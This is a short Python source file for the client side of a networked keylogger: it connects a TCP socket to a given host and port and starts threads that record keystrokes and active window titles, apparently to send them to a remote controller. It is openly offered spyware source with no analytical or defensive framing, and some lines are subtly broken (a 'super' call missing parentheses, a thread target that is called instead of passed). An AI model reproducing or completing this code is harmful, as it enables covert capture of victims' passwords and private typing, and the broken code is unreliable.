import socket
import os
import sys
from threading import Thread
from sendrecv import SendRecv
from keylog import Keylogger

class Client(Keylogger):
    def __init__(self, host, port):
        super.__init__()
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(3600)
        self.controller = SendRecv(self.sock)
        self.keylogger = Keylogger(self.controller)
        self.listenThread = Thread(target=self.keylogger.listen)
        self.titleThread = Thread(target=self.keylogger.get_title())

        self.sock.connect((host, port))
        self.logging()

    def logging(self):
        self.listenThread.start()
        self.titleThread.start()




    